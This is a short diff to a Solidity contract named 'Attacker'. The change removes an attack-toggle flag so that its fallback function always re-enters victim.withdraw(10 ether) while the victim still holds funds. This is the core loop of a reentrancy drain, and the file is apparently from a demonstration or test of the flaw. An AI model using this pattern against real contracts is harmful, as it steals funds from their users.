@@ -30,10 +30,8 @@ contract Attacker {
     }
 
     function() public payable {
-        if (isAttack) {
-            if (address(victim).balance >= 10 ether) {
-                victim.withdraw(10 ether);
-            }
+        if (address(victim).balance >= 10 ether) {
+            victim.withdraw(10 ether);
         }
     }
 }
